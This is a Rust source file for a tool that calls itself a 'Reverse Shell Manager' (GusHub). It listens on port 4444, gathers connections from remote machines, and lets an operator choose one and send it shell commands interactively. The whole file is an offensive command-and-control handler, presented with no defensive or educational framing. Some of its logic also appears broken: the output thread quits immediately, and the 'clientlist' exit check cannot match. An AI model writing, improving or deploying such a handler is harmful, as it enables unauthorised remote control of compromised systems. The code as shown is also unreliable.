use std::io::{Read, Write, stdin, stdout};
use std::net::{TcpStream, TcpListener};
use std::thread;
use std::sync::mpsc::channel;
use std::sync::{Arc, Mutex};

const HOST: &str = "0.0.0.0";
const PORT: u32 = 4444;

#[derive(Debug)]
struct Client {
    stream: TcpStream,
    address: String,
}

// Implement the traits so that we can just call methods instead of using the field.

impl Read for Client {
    fn read(&mut self, buf: &mut [u8]) -> Result<usize, std::io::Error> {
        self.stream.read(buf)
    }
}

impl Write for Client {
    fn write(&mut self, buf: &[u8]) -> Result<usize, std::io::Error> {
        self.stream.write(buf)
    }
    fn flush(&mut self) -> Result<(), std::io::Error> {
        self.stream.flush()
    }
}

impl Client {
    pub fn new(stream: TcpStream, address: String) -> Self {
        Self {
            stream,
            address
        }
    }
    pub fn address(&self) -> &str {
        &self.address
    }
    pub fn try_split(&self) -> Result<(TcpStream, TcpStream), std::io::Error> {
        Ok((self.stream.try_clone()?, self.stream.try_clone()?))
    }
}

fn main() {
    let mut clients = Vec::<Client>::new();
    let client_buffer = Arc::new(Mutex::new(Vec::<Client>::new()));

    let cbclone = Arc::clone(&client_buffer);
    thread::spawn(move || {
        get_new_connections(cbclone);
    });

    print!("\
    GusHub\n\
    Reverse Shell Manager\n\
    ");

    loop {

        {
            let mut cb = client_buffer.lock().unwrap();
            while let Some(client) = cb.pop() {
                clients.push(client);
            }
        }

        if clients.len() == 0 {
            continue;
        }

        for (i, client) in clients.iter().enumerate() {
            println!("({}) - ({})", i, client.address());
        }

        let mut input = String::new();
        stdin().read_line(&mut input).expect("stdin failure");
        let choice = match input.trim().parse::<usize>() {
            Ok(n) if n <= 0 || n > clients.len() => continue,
            Err(_) => continue,
            Ok(n) => n
        };

        // We will now handle the choice

        handle_connection(clients.get(choice - 1).unwrap()).expect("Handle connection failed");
    }
}

fn handle_connection(client: &Client) -> Result<(), std::io::Error> {
    let (mut reader, mut writer) = client.try_split()?;
    let (sender, receiver) = channel();

    let writer_t = thread::spawn(move || {
        loop {
            let mut buf = String::new();
            stdin().read_line(&mut buf).unwrap();
            if buf == "clientlist" {break;}
            buf += "\n";
            writer.write_all(buf.as_bytes()).unwrap();
        }
    });

    thread::spawn(move || {
        loop {
            if let Err(_) = receiver.try_recv() {break;}

            let mut buf = vec![0; 1024];
            match reader.read(&mut buf) {
                Ok(0) => break,
                Err(_) => break,
                Ok(n) => stdout().write_all(&buf[..n]).unwrap(),
            }
        }
    });

    writer_t.join().unwrap();
    sender.send(1).unwrap();

    Ok(())
}

fn get_new_connections(client_buffer: Arc<Mutex<Vec<Client>>>) {
    let listener = TcpListener::bind(format!("{}:{}", HOST, PORT)).unwrap();

    loop {
        let (stream, peer_addr) = listener.accept().unwrap();
        let client = Client::new(stream, peer_addr.to_string());
        {
            let mut cb = client_buffer.lock().unwrap();
            cb.push(client);
        }
    }
}